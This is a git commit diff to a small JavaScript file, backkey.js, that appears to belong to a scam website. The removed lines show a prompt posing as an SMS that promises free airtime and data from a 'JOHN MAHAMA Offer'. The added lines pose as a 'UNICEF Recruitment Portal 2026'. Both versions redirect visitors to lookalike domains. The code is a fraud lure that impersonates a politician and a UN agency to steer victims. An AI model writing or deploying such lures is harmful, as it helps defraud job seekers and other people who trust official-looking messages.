a00f2bc5f8723588f116fb3427eb37d13a849454
uptomars <Kenoly555+me@gmail.com>
2026-03-23 04:46:20 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'JOBS'
+  password=prompt('SMS: Welcome To UNICEF Recruitment Portal 2026, Kindly Press OK to PROCEED ','JOBS');
+if (password != 'JOBS') {
+location.href='https://unicef-career.workvisa.live/staff';
 }
